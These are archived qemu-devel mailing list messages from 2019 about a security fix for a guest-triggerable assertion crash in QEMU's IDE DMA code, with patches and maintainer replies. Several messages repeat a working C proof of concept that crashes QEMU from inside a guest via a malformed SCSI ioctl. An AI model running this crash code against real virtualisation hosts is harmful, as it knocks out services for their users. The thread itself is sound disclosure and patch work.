=== Content from lists.nongnu.org_f9dd6939_20250110_194810.html ===


| | **qemu-devel** | | --- | |
| --- | --- |

[[Top](../)][[All Lists](/archive/html)]

[Advanced](/archive/cgi-bin/namazu.cgi?idxname=qemu-devel)

---

[[Date Prev](msg01650.html)][[Date Next](msg01652.html)][[Thread Prev](msg01634.html)][[Thread Next](msg01650.html)][[Date Index](index.html#01651)][[Thread Index](threads.html#01651)]

## [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to preve

---

| **From**: | Alexander Popov |
| --- | --- |

| **Subject**: | [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest |
| **Date**: | Fri, 5 Jul 2019 17:07:49 +0300 |

---

```
This assertion was introduced in the commit a718978ed58a in July 2015.
It implies that the size of successful DMA transfers handled in
ide_dma_cb() should be multiple of 512 (the size of a sector).

But guest systems can initiate DMA transfers that don't fit this
requirement. Let's improve the assertion to prevent qemu DoS from quests.

PoC for Linux that uses SCSI_IOCTL_SEND_COMMAND to perform such an ATA
command and crash qemu:

#include <stdio.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <scsi/scsi.h>
#include <scsi/scsi_ioctl.h>

#define CMD_SIZE 2048

struct scsi_ioctl_cmd_6 {
        unsigned int inlen;
        unsigned int outlen;
        unsigned char cmd[6];
        unsigned char data[];
};

int main(void)
{
        intptr_t fd = 0;
        struct scsi_ioctl_cmd_6 *cmd = NULL;

        cmd = malloc(CMD_SIZE);
        if (!cmd) {
                perror("[-] malloc");
                return 1;
        }

        memset(cmd, 0, CMD_SIZE);
        cmd->inlen = 1337;
        cmd->cmd[0] = READ_6;

        fd = open("/dev/sg0", O_RDONLY);
        if (fd == -1) {
                perror("[-] opening sg");
                return 1;
        }

        printf("[+] sg0 is opened\n");

        printf("[.] qemu should break here:\n");
        fflush(stdout);
        ioctl(fd, SCSI_IOCTL_SEND_COMMAND, cmd);
        printf("[-] qemu didn't break\n");

        free(cmd);

        return 1;
}

Signed-off-by: Alexander Popov <address@hidden>
---
 hw/ide/core.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/hw/ide/core.c b/hw/ide/core.c
index 6afadf8..304fe69 100644
--- a/hw/ide/core.c
+++ b/hw/ide/core.c
@@ -868,7 +868,7 @@ static void ide_dma_cb(void *opaque, int ret)

     sector_num = ide_get_sector(s);
     if (n > 0) {
-        assert(n * 512 == s->sg.size);
+        assert(n == s->sg.size / 512);
         dma_buf_commit(s, s->sg.size);
         sector_num += n;
         ide_set_sector(s, sector_num);
--
2.7.4

```

---

reply via email to

---

| [Prev in Thread] | **Current Thread** | [[Next in Thread](msg01650.html)] |
| --- | --- | --- |

* **[Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest**,
  *Alexander Popov* **<=**
  + **[Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg01650.html)**, *Alexander Popov*, 2019/07/05
  + **[Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg03354.html)**, *Alexander Popov*, 2019/07/15
    - **[Re: [Qemu-devel] [Qemu-block] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg03736.html)**, *Kevin Wolf*, 2019/07/16
      * **[Re: [Qemu-devel] [Qemu-block] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg03817.html)**, *John Snow*, 2019/07/16* **[Re: [Qemu-devel] [Qemu-block] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg03869.html)**, *P J P*, 2019/07/16
  + **[Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg05834.html)**, *John Snow*, 2019/07/25
    - **[Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg06169.html)**, *Alexander Popov*, 2019/07/26

---

* Prev by Date:
  **[Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg01650.html)**
* Next by Date:
  **[[Qemu-devel] [Bug 1835477] Re: Converting qcow2 to vmdk on MacOSX results in a non-bootable image](msg01652.html)**
* Previous by thread:
  **[[Qemu-devel] [PATCH v15 0/7] virtio pmem driver](msg01634.html)**
* Next by thread:
  **[Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg01650.html)**
* Index(es):
  + [**Date**](index.html#01651)
  + [**Thread**](threads.html#01651)



=== Content from lists.nongnu.org_c07043cb_20250110_194811.html ===


| | **qemu-devel** | | --- | |
| --- | --- |

[[Top](../)][[All Lists](/archive/html)]

[Advanced](/archive/cgi-bin/namazu.cgi?idxname=qemu-devel)

---

[[Date Prev](msg02164.html)][[Date Next](msg02166.html)][[Thread Prev](msg02159.html)][[Thread Next](msg02263.html)][[Date Index](index.html#02165)][[Thread Index](threads.html#02165)]

## [PATCH v2 1/1] ide: check DMA transfer size in ide\_dma\_cb() to prevent q

---

| **From**: | Alexander Popov |
| --- | --- |

| **Subject**: | [PATCH v2 1/1] ide: check DMA transfer size in ide\_dma\_cb() to prevent qemu DoS from quests |
| **Date**: | Thu, 14 Nov 2019 20:25:31 +0300 |

---

```
The commit a718978ed58a from July 2015 introduced the assertion which
implies that the size of successful DMA transfers handled in ide_dma_cb()
should be multiple of 512 (the size of a sector). But guest systems can
initiate DMA transfers that don't fit this requirement.

PoC for Linux that uses SCSI_IOCTL_SEND_COMMAND to perform such an ATA
command and crash qemu:

#include <stdio.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <scsi/scsi.h>
#include <scsi/scsi_ioctl.h>

#define CMD_SIZE 2048

struct scsi_ioctl_cmd_6 {
        unsigned int inlen;
        unsigned int outlen;
        unsigned char cmd[6];
        unsigned char data[];
};

int main(void)
{
        intptr_t fd = 0;
        struct scsi_ioctl_cmd_6 *cmd = NULL;

        cmd = malloc(CMD_SIZE);
        if (!cmd) {
                perror("[-] malloc");
                return 1;
        }

        memset(cmd, 0, CMD_SIZE);
        cmd->inlen = 1337;
        cmd->cmd[0] = READ_6;

        fd = open("/dev/sg0", O_RDONLY);
        if (fd == -1) {
                perror("[-] opening sg");
                return 1;
        }

        printf("[+] sg0 is opened\n");

        printf("[.] qemu should break here:\n");
        fflush(stdout);
        ioctl(fd, SCSI_IOCTL_SEND_COMMAND, cmd);
        printf("[-] qemu didn't break\n");

        free(cmd);

        return 1;
}

For fixing that let's check the number of bytes prepared for the transfer
by the prepare_buf() handler. If it is not a multiple of 512 then end
the DMA transfer with an error.

That also fixes the I/O stall in guests after a DMA transfer request
for less than the size of a sector.

Signed-off-by: Alexander Popov <address@hidden>
---
 hw/ide/core.c | 11 +++++------
 1 file changed, 5 insertions(+), 6 deletions(-)

diff --git a/hw/ide/core.c b/hw/ide/core.c
index 754ff4dc34..85aac614f0 100644
--- a/hw/ide/core.c
+++ b/hw/ide/core.c
@@ -849,6 +849,7 @@ static void ide_dma_cb(void *opaque, int ret)
     int64_t sector_num;
     uint64_t offset;
     bool stay_active = false;
+    int32_t prepared = 0;

     if (ret == -EINVAL) {
         ide_dma_error(s);
@@ -892,12 +893,10 @@ static void ide_dma_cb(void *opaque, int ret)
     n = s->nsector;
     s->io_buffer_index = 0;
     s->io_buffer_size = n * 512;
-    if (s->bus->dma->ops->prepare_buf(s->bus->dma, s->io_buffer_size) < 512) {
-        /* The PRDs were too short. Reset the Active bit, but don't raise an
-         * interrupt. */
-        s->status = READY_STAT | SEEK_STAT;
-        dma_buf_commit(s, 0);
-        goto eot;
+    prepared = s->bus->dma->ops->prepare_buf(s->bus->dma, s->io_buffer_size);
+    if (prepared % 512) {
+        ide_dma_error(s);
+        return;
     }

     trace_ide_dma_cb(s, sector_num, n, IDE_DMA_CMD_str(s->dma_cmd));
--
2.21.0

```

---

reply via email to

---

| [Prev in Thread] | **Current Thread** | [[Next in Thread](msg02263.html)] |
| --- | --- | --- |

* **[PATCH v2 1/1] ide: check DMA transfer size in ide\_dma\_cb() to prevent qemu DoS from quests**,
  *Alexander Popov* **<=**
  + **[Re: [PATCH v2 1/1] ide: check DMA transfer size in ide\_dma\_cb() to prevent qemu DoS from quests](msg02263.html)**, *Darren Kenny*, 2019/11/15
  + **[Re: [PATCH v2 1/1] ide: check DMA transfer size in ide\_dma\_cb() to prevent qemu DoS from quests](msg03582.html)**, *Kevin Wolf*, 2019/11/21
    - **[Re: [PATCH v2 1/1] ide: check DMA transfer size in ide\_dma\_cb() to prevent qemu DoS from quests](msg04403.html)**, *Alexander Popov*, 2019/11/26
      * **[Re: [PATCH v2 1/1] ide: check DMA transfer size in ide\_dma\_cb() to prevent qemu DoS from quests](msg04407.html)**, *Kevin Wolf*, 2019/11/26* **[Re: [PATCH v2 1/1] ide: check DMA transfer size in ide\_dma\_cb() to prevent qemu DoS from quests](msg05283.html)**, *Alexander Popov*, 2019/11/30

---

* Prev by Date:
  **[Re: Convert VMDK to RAW](msg02164.html)**
* Next by Date:
  **[Re: [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg02166.html)**
* Previous by thread:
  **[Convert VMDK to RAW](msg02159.html)**
* Next by thread:
  **[Re: [PATCH v2 1/1] ide: check DMA transfer size in ide\_dma\_cb() to prevent qemu DoS from quests](msg02263.html)**
* Index(es):
  + [**Date**](index.html#02165)
  + [**Thread**](threads.html#02165)



=== Content from lists.nongnu.org_a56d16ee_20250110_194811.html ===


| | **qemu-devel** | | --- | |
| --- | --- |

[[Top](../)][[All Lists](/archive/html)]

[Advanced](/archive/cgi-bin/namazu.cgi?idxname=qemu-devel)

---

[[Date Prev](msg03868.html)][[Date Next](msg03870.html)][[Thread Prev](msg03817.html)][[Thread Next](msg05834.html)][[Date Index](index.html#03869)][[Thread Index](threads.html#03869)]

## Re: [Qemu-devel] [Qemu-block] [QEMU-SECURITY] ide: fix assertion in ide\_

---

| **From**: | P J P |
| --- | --- |

| **Subject**: | Re: [Qemu-devel] [Qemu-block] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest |
| **Date**: | Tue, 16 Jul 2019 21:48:20 +0530 (IST) |

---

```
+-- On Tue, 16 Jul 2019, John Snow wrote --+
| I also feel that a privileged DOS by a guest of a legacy device is actually
| low priority security-wise, unless we can demonstrate that there are side
| effects that can be exploited.

Right, we are not treating this as a CVE issue as is. Privileged guest user
has many ways to cause similar DoS effect, without triggering this assert(3).

Thank you.
--
Prasad J Pandit / Red Hat Product Security Team
47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F

```

---

reply via email to

---

| [[Prev in Thread](msg03817.html)] | **Current Thread** | [[Next in Thread](msg05834.html)] |
| --- | --- | --- |

* **[[Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg01651.html)**, *Alexander Popov*, 2019/07/05
  + **[Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg01650.html)**, *Alexander Popov*, 2019/07/05
  + **[Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg03354.html)**, *Alexander Popov*, 2019/07/15
    - **[Re: [Qemu-devel] [Qemu-block] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg03736.html)**, *Kevin Wolf*, 2019/07/16
      * **[Re: [Qemu-devel] [Qemu-block] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg03817.html)**, *John Snow*, 2019/07/16* **Re: [Qemu-devel] [Qemu-block] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest**,
          *P J P* **<=**
  + **[Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg05834.html)**, *John Snow*, 2019/07/25
    - **[Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg06169.html)**, *Alexander Popov*, 2019/07/26

---

* Prev by Date:
  **[Re: [Qemu-devel] [PATCH v2 2/4] tests/qemu-iotests/group: Remove some more tests from the "auto" group](msg03868.html)**
* Next by Date:
  **[[Qemu-devel] [PATCH v5] LUKS: support preallocation](msg03870.html)**
* Previous by thread:
  **[Re: [Qemu-devel] [Qemu-block] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg03817.html)**
* Next by thread:
  **[Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg05834.html)**
* Index(es):
  + [**Date**](index.html#03869)
  + [**Thread**](threads.html#03869)



=== Content from lists.nongnu.org_2f03e804_20250110_194811.html ===


| | **qemu-devel** | | --- | |
| --- | --- |

[[Top](../)][[All Lists](/archive/html)]

[Advanced](/archive/cgi-bin/namazu.cgi?idxname=qemu-devel)

---

[[Date Prev](msg00596.html)][[Date Next](msg00598.html)][[Thread Prev](msg00581.html)][[Thread Next](msg00645.html)][[Date Index](index.html#00597)][[Thread Index](threads.html#00597)]

## Re: [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu D

---

| **From**: | Alexander Popov |
| --- | --- |

| **Subject**: | Re: [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest |
| **Date**: | Wed, 6 Nov 2019 13:17:51 +0300 |
| **User-agent**: | Mozilla/5.0 (X11; Linux x86\_64; rv:68.0) Gecko/20100101 Thunderbird/68.1.1 |

---

```
On 27.07.2019 00:09, Alexander Popov wrote:
> On 26.07.2019 2:25:03 GMT+02:00, John Snow <address@hidden> wrote:
>> Oh, this is fun.
> ...
>> I can worry about a proper fix for 4.2+.
>
> Hello John,
>
> Thanks for your letter.
>
> I double-checked the git history and mailing list, I'm still sure
> that my fix for this assertion is correct.

Hello!

I'm pointing politely to this issue again.

It crashes qemu during syzkaller fuzzing.

It's really annoying to manually apply the fix against it to qemu.

I'm quoting my patch from July that _correctly_ fixes the wrong assertion
introduced in the commit a718978ed58a.

Why don't you apply my commit and then do the refactoring later when you want?

Best regards,
Alexander

On 05.07.2019 17:07, Alexander Popov wrote:
> This assertion was introduced in the commit a718978ed58a in July 2015.
> It implies that the size of successful DMA transfers handled in
> ide_dma_cb() should be multiple of 512 (the size of a sector).
>
> But guest systems can initiate DMA transfers that don't fit this
> requirement. Let's improve the assertion to prevent qemu DoS from quests.
>
> PoC for Linux that uses SCSI_IOCTL_SEND_COMMAND to perform such an ATA
> command and crash qemu:
>
> #include <stdio.h>
> #include <sys/ioctl.h>
> #include <stdint.h>
> #include <sys/types.h>
> #include <sys/stat.h>
> #include <fcntl.h>
> #include <string.h>
> #include <stdlib.h>
> #include <scsi/scsi.h>
> #include <scsi/scsi_ioctl.h>
>
> #define CMD_SIZE 2048
>
> struct scsi_ioctl_cmd_6 {
>       unsigned int inlen;
>       unsigned int outlen;
>       unsigned char cmd[6];
>       unsigned char data[];
> };
>
> int main(void)
> {
>       intptr_t fd = 0;
>       struct scsi_ioctl_cmd_6 *cmd = NULL;
>
>       cmd = malloc(CMD_SIZE);
>       if (!cmd) {
>               perror("[-] malloc");
>               return 1;
>       }
>
>       memset(cmd, 0, CMD_SIZE);
>       cmd->inlen = 1337;
>       cmd->cmd[0] = READ_6;
>
>       fd = open("/dev/sg0", O_RDONLY);
>       if (fd == -1) {
>               perror("[-] opening sg");
>               return 1;
>       }
>
>       printf("[+] sg0 is opened\n");
>
>       printf("[.] qemu should break here:\n");
>       fflush(stdout);
>       ioctl(fd, SCSI_IOCTL_SEND_COMMAND, cmd);
>       printf("[-] qemu didn't break\n");
>
>       free(cmd);
>
>       return 1;
> }
>
> Signed-off-by: Alexander Popov <address@hidden>
> ---
>  hw/ide/core.c | 2 +-
>  1 file changed, 1 insertion(+), 1 deletion(-)
>
> diff --git a/hw/ide/core.c b/hw/ide/core.c
> index 6afadf8..304fe69 100644
> --- a/hw/ide/core.c
> +++ b/hw/ide/core.c
> @@ -868,7 +868,7 @@ static void ide_dma_cb(void *opaque, int ret)
>
>      sector_num = ide_get_sector(s);
>      if (n > 0) {
> -        assert(n * 512 == s->sg.size);
> +        assert(n == s->sg.size / 512);
>          dma_buf_commit(s, s->sg.size);
>          sector_num += n;
>          ide_set_sector(s, sector_num);

```

---

reply via email to

---

| [Prev in Thread] | **Current Thread** | [[Next in Thread](msg00645.html)] |
| --- | --- | --- |

* **Re: [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest**,
  *Alexander Popov* **<=**
  + **[Re: [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg00645.html)**, *Michael S. Tsirkin*, 2019/11/06
    - **[Re: [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg00796.html)**, *Alexander Popov*, 2019/11/06
  + **[Re: [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg00644.html)**, *Michael S. Tsirkin*, 2019/11/06
    - **[Re: [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg00800.html)**, *Alexander Popov*, 2019/11/06
      * **[Re: [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg02166.html)**, *Alexander Popov*, 2019/11/14

---

* Prev by Date:
  **[Re: [virtio-dev] Re: guest / host buffer sharing ...](msg00596.html)**
* Next by Date:
  **[Re: backup\_calculate\_cluster\_size does not consider source](msg00598.html)**
* Previous by thread:
  **[Re: [PATCH v14 00/11] Build ACPI Heterogeneous Memory Attribute Table (HMAT)](msg00581.html)**
* Next by thread:
  **[Re: [QEMU-SECURITY] ide: fix assertion in ide\_dma\_cb() to prevent qemu DoS from quest](msg00645.html)**
* Index(es):
  + [**Date**](index.html#00597)
  + [**Thread**](threads.html#00597)


